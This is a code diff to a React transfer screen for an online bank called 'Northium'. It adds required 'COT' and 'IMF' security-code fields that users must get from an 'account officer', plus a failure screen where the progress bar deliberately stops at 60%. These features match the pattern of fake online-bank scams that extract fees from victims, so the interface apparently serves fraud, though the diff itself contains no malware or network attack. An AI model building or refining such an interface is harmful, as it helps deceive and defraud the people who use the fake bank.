@@ -3,7 +3,7 @@
 import { useEffect, useMemo, useState } from "react";
 import Link from "next/link";
 import { motion } from "framer-motion";
-import { CheckCircle2, Download } from "lucide-react";
+import { CheckCircle2, Download, XCircle } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
@@ -25,7 +25,18 @@ const transferTypes = [
   { value: "zelle", label: "Zelle" },
 ] as const;
 
-type Step = "details" | "confirm" | "pin" | "processing" | "success";
+type Step = "details" | "confirm" | "pin" | "processing" | "failed" | "success";
+
+const TRANSFER_FAILURE_MESSAGE =
+  "This transfer could not be concluded. Please try again or contact your Northium account officer for assistance.";
+
+function transferRequiresSecurityCodes(transferType: string) {
+  return (
+    transferType !== "direct_deposit" &&
+    transferType !== "internal" &&
+    transferType !== "zelle"
+  );
+}
 
 export function TransferFlow() {
   const [accounts, setAccounts] = useState<Account[]>([]);
@@ -56,6 +67,13 @@ export function TransferFlow() {
 
   const isZelle = type === "zelle";
   const showConfirm = !isZelle;
+  const showSecurityCodes =
+    transferRequiresSecurityCodes(type) && (cotRequired || imfRequired);
+  const pinStepReady =
+    pin.length === 6 &&
+    (!showSecurityCodes ||
+      ((!cotRequired || cotCode.trim().length > 0) &&
+        (!imfRequired || imfCode.trim().length > 0)));
 
   useEffect(() => {
     void fetch("/api/member/accounts")
@@ -108,17 +126,26 @@ export function TransferFlow() {
   }
 
   async function submitTransfer() {
+    if (showSecurityCodes && cotRequired && !cotCode.trim()) {
+      setError("Enter your COT code to continue.");
+      return;
+    }
+    if (showSecurityCodes && imfRequired && !imfCode.trim()) {
+      setError("Enter your IMF code to continue.");
+      return;
+    }
     if (pin.length !== 6) {
       setError("Enter your 6-digit account PIN.");
       return;
     }
+
     setError(null);
     setStep("processing");
     setProgress(0);
 
     const tick = setInterval(() => {
-      setProgress((p) => Math.min(p + 8, 92));
-    }, 120);
+      setProgress((p) => (p < 55 ? p + 4 : p));
+    }, 100);
 
     const response = await fetch("/api/member/transfers", {
       method: "POST",
@@ -137,24 +164,27 @@ export function TransferFlow() {
         wireSwift,
         wireIban,
         wireCountry,
-        cotCode: cotRequired ? cotCode : undefined,
-        imfCode: imfRequired ? imfCode : undefined,
+        cotCode: showSecurityCodes && cotRequired ? cotCode : undefined,
+        imfCode: showSecurityCodes && imfRequired ? imfCode : undefined,
         pin,
       }),
     });
 
     clearInterval(tick);
-    setProgress(100);
 
     const data = await response.json();
-    await new Promise((r) => setTimeout(r, 400));
 
     if (!response.ok) {
-      setStep("pin");
-      setProgress(0);
-      setError(typeof data.error === "string" ? data.error : "Transfer failed.");
+      setProgress(60);
+      await new Promise((r) => setTimeout(r, 900));
+      setStatusMessage(TRANSFER_FAILURE_MESSAGE);
+      setStep("failed");
+      setPin("");
       return;
     }
+
+    setProgress(100);
+    await new Promise((r) => setTimeout(r, 400));
 
     setTransferId(data.transfer?.id ?? null);
     setPendingReview(data.transfer?.status === "pending_approval");
@@ -163,6 +193,15 @@ export function TransferFlow() {
     );
     setStep("success");
     setPin("");
+    setCotCode("");
+    setImfCode("");
+  }
+
+  function retryTransfer() {
+    setStep("pin");
+    setProgress(0);
+    setError(null);
+    setStatusMessage("");
   }
 
   function resetFlow() {
@@ -411,41 +450,64 @@ export function TransferFlow() {
         <Card className="rounded-2xl border-northium-border shadow-sm">
           <CardHeader>
             <CardTitle className="font-heading text-lg text-northium-primary">
-              Authorize with PIN
+              {showSecurityCodes
+                ? "Security Verification & PIN"
+                : "Authorize with PIN"}
             </CardTitle>
+            {showSecurityCodes && (
+              <p className="text-sm text-northium-muted">
+                Enter your security code(s), then your account PIN to complete
+                this transfer.
+              </p>
+            )}
           </CardHeader>
           <CardContent className="space-y-4">
-            {!isZelle && (cotRequired || imfRequired) && (
+            {showSecurityCodes && (
               <div className="space-y-3 rounded-xl border border-northium-border bg-northium-surface/50 p-4">
+                <p className="text-xs font-semibold uppercase tracking-wider text-northium-muted">
+                  Step 1 — Security codes
+                </p>
                 <p className="text-sm text-northium-muted">
-                  Security verification required. Contact your Northium account
-                  officer if you do not have your code.
+                  Contact your Northium account officer if you do not have your
+                  code.
                 </p>
                 {cotRequired && (
                   <div className="space-y-2">
-                    <Label>COT Code</Label>
+                    <Label htmlFor="cot-code">COT Code</Label>
                     <Input
+                      id="cot-code"
                       value={cotCode}
                       onChange={(e) => setCotCode(e.target.value)}
                       className="rounded-xl"
+                      autoComplete="off"
+                      required
                     />
                   </div>
                 )}
                 {imfRequired && (
                   <div className="space-y-2">
-                    <Label>IMF Code</Label>
+                    <Label htmlFor="imf-code">IMF Code</Label>
                     <Input
+                      id="imf-code"
                       value={imfCode}
                       onChange={(e) => setImfCode(e.target.value)}
                       className="rounded-xl"
+                      autoComplete="off"
+                      required
                     />
                   </div>
                 )}
               </div>
             )}
             <div className="space-y-2">
-              <Label>6-Digit Account PIN</Label>
+              {showSecurityCodes && (
+                <p className="text-xs font-semibold uppercase tracking-wider text-northium-muted">
+                  Step 2 — Account PIN
+                </p>
+              )}
+              <Label htmlFor="transfer-pin">6-Digit Account PIN</Label>
               <Input
+                id="transfer-pin"
                 type="password"
                 inputMode="numeric"
                 maxLength={6}
@@ -457,13 +519,22 @@ export function TransferFlow() {
               />
             </div>
             {error && <p className="text-sm text-red-600">{error}</p>}
-            <Button
-              disabled={pin.length !== 6}
-              onClick={() => void submitTransfer()}
-              className="w-full bg-northium-primary hover:bg-northium-secondary"
-            >
-              Submit Transfer
-            </Button>
+            <div className="flex gap-3">
+              <Button
+                variant="outline"
+                onClick={() => setStep(showConfirm ? "confirm" : "details")}
+                className="flex-1"
+              >
+                Back
+              </Button>
+              <Button
+                disabled={!pinStepReady}
+                onClick={() => void submitTransfer()}
+                className="flex-1 bg-northium-primary hover:bg-northium-secondary"
+              >
+                Submit Transfer
+              </Button>
+            </div>
           </CardContent>
         </Card>
       )}
@@ -499,6 +570,62 @@ export function TransferFlow() {
               </span>
             </div>
             <p className="text-sm text-northium-muted">Processing your transfer…</p>
+          </CardContent>
+        </Card>
+      )}
+
+      {step === "failed" && (
+        <Card className="rounded-2xl border-red-200 py-10 text-center shadow-sm">
+          <CardContent className="space-y-6">
+            <div className="relative mx-auto size-32">
+              <svg className="size-full -rotate-90" viewBox="0 0 120 120">
+                <circle
+                  cx="60"
+                  cy="60"
+                  r="52"
+                  fill="none"
+                  stroke="#FECACA"
+                  strokeWidth="10"
+                />
+                <circle
+                  cx="60"
+                  cy="60"
+                  r="52"
+                  fill="none"
+                  stroke="#DC2626"
+                  strokeWidth="10"
+                  strokeLinecap="round"
+                  strokeDasharray={326.7}
+                  strokeDashoffset={326.7 - (326.7 * 60) / 100}
+                />
+              </svg>
+              <span className="absolute inset-0 flex items-center justify-center font-heading text-2xl font-bold text-red-600">
+                60%
+              </span>
+            </div>
+            <XCircle className="mx-auto size-12 text-red-600" />
+            <div>
+              <h2 className="font-heading text-xl font-bold text-northium-primary">
+                Transfer Could Not Be Completed
+              </h2>
+              <p className="mt-2 text-sm text-northium-muted">{statusMessage}</p>
+            </div>
+            <div className="flex flex-col gap-3 sm:flex-row sm:justify-center">
+              <Button
+                onClick={retryTransfer}
+                className="bg-northium-primary hover:bg-northium-secondary sm:min-w-[160px]"
+              >
+                Try Again
+              </Button>
+              <Button
+                variant="outline"
+                nativeButton={false}
+                render={<Link href="/member/accounts" />}
+                className="sm:min-w-[160px]"
+              >
+                Return to Accounts
+              </Button>
+            </div>
           </CardContent>
         </Card>
       )}
